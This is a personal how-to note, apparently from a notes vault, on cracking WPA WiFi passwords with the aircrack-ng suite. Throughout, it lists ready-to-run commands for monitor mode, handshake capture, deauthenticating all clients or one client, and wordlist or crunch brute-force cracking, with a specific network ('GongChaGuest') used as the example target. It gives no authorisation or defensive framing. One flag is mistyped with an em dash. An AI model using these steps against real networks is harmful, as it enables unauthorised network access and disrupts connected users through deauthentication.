---
title: "Hack WiFi Network"
created: 2019-03-16T02:53:00.677-05:00
modified: 2026-05-21T13:53:42.109-05:00
parent: "[[Hacking - Network]]"
children: []
---
First install [[aircrack-ng (Suite)]] binary or use [[Kali Linux]]
###### If airodump-ng, aireplay or airtun-ng stops working after a short period of time
```
airmon-ng check kill
```
###### Set NIC as monitor mode
```
airmon-ng start <NIC name>  #this would change the NIC name
```

or
```
ifconfig <NIC name> down
iwconfig <NIC name> mode monitor
ifconfig <NIC name> up
```
###### Get AP’s BSSID/MAC and channel
```
airodump-ng <NIC monitor mode>
```
###### Listen for handshake on channel and write to file
```
airodump-ng -c <channel> -w SCAN_TEST —-bssid <AP’s MAC/BSSID> <NIC monitor mode>
```
- -c channel number
- -w file to write to
- --bssid

###### Open new terminal and deauthenticate
```
deauth every user 
aireplay-ng -0 0 -a <AP’s MAC/BSSID> <NIC monitor mode>

deauth single user
aireplay-ng -0 0 -a <AP’s MAC/BSSID> -c <client’s MAC> <NIC monitor mode>
```
- -0 N deauth and count
- -a replay option: set Access Point MAC address
- -c client’s MAC to deauthenticate

###### Wait until handshake is caught
###### Crack WPA password
```
aircrack-ng -w <wordlist path> SCAN_TEST-01.cap -e GongChaGuest
```
- -w path to wordlist file
- -e BSSID or ESSID

or
```
echo “gongguest” | aircrack-ng -w - SCAN_TEST-01.cap -e GongChaGuest
```

or
```
crunch 1 8 | aircrack-ng -w - SCAN_TEST-01.cap -e GongChaGuest
crunch 1 8 will generate strins from a to zzzzzzzz
```
